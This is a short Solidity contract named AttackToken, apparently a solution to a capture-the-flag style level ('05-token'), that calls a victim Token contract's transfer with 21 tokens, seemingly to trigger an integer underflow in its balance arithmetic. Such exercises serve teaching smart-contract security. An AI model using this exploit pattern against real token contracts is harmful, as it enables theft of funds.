 // SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./05-token.sol";

contract AttackToken {
    Token public victimContract;

  constructor(address _victimContractAddress) {
    victimContract = Token(_victimContractAddress);
  }

  function transfer(address _to) public {
    victimContract.transfer(_to, 20 + 1 );
  }

}